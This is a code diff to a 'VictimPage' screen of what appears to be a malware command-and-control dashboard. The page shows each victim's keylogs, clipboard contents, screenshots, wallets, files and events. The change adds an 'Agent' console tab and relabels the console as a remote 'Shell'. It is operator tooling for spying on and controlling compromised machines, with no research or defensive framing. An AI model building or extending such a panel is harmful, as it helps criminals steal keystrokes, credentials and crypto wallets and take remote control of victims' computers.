@@ -16,6 +16,8 @@ import { ErrorState, Empty, SkeletonRows } from '@/components/ui/table';
 import { WalletTable } from '@/components/wallet-table';
 import { FileTree } from '@/components/file-tree';
 import { ConsolePanel } from '@/components/console-panel';
+import { EventContent } from '@/components/event-content';
+import { AgentConsole } from '@/components/agent-console';
 import { TaskDialog } from '@/components/task-dialog';
 import { TaskList } from '@/components/task-list';
 import { ago, bytes, copy, dateTime, flag, osTone, short } from '@/lib/format';
@@ -40,7 +42,7 @@ export default function VictimPage() {
   const [keyQuery, setKeyQuery] = useState('');
   const keylogs = useApi<{ items: Keylog[] }>(`/victims/${id}/keylogs?q=${encodeURIComponent(keyQuery)}&limit=200`);
   const screenshots = useApi<{ items: Array<{ id: string; ts: string; width: number | null; height: number | null }> }>(`/victims/${id}/screenshots`);
-  const events = useApi<{ items: Array<{ id: string; kind: string; createdAt: string; data: Record<string, unknown> }> }>(`/victims/${id}/events`);
+  const events = useApi<{ items: Array<{ id: string; kind: string; legacy: string; createdAt: string; data: Record<string, unknown> }> }>(`/victims/${id}/events`);
 
   if (victim.error) return <ErrorState message={victim.error.message} retry={victim.refresh} />;
   const data = victim.data;
@@ -137,7 +139,8 @@ export default function VictimPage() {
             <TabsTrigger value="keylogs">Keylogs</TabsTrigger>
             <TabsTrigger value="clipboard">Clipboard</TabsTrigger>
             <TabsTrigger value="screens">Screens</TabsTrigger>
-            <TabsTrigger value="console">Console</TabsTrigger>
+            <TabsTrigger value="console">Shell</TabsTrigger>
+            <TabsTrigger value="agent">Agent</TabsTrigger>
             <TabsTrigger value="tasks">Tasks</TabsTrigger>
           </TabsList>
 
@@ -171,7 +174,11 @@ export default function VictimPage() {
                 <CardContent className="space-y-1">
                   {(events.data?.items ?? []).length === 0 ? <p className="text-xs text-muted">No events</p> : null}
                   {(events.data?.items ?? []).slice(0, 12).map((event) => (
-                    <div key={event.id} className="flex gap-2 text-2xs"><Badge tone="default">{event.kind}</Badge><span className="truncate font-mono text-muted">{JSON.stringify(event.data).slice(0, 160)}</span><span className="ml-auto text-muted/60">{ago(event.createdAt)} ago</span></div>
+                    <div key={event.id} className="flex items-start gap-2 text-2xs">
+                      <Badge tone="default">{event.kind}</Badge>
+                      <EventContent kind={event.kind} data={event.data} legacy={event.legacy} />
+                      <span className="ml-auto shrink-0 text-muted/60">{ago(event.createdAt)} ago</span>
+                    </div>
                   ))}
                 </CardContent>
               </Card>
@@ -278,6 +285,10 @@ export default function VictimPage() {
           </TabsContent>
 
           <TabsContent value="console" className="pt-3"><Card><ConsolePanel victimId={id} /></Card></TabsContent>
+
+          <TabsContent value="agent" className="pt-3">
+            <Card><AgentConsole victimId={id} /></Card>
+          </TabsContent>
 
           <TabsContent value="tasks" className="pt-3"><Card><TaskList victim={id} /></Card></TabsContent>
         </Tabs>
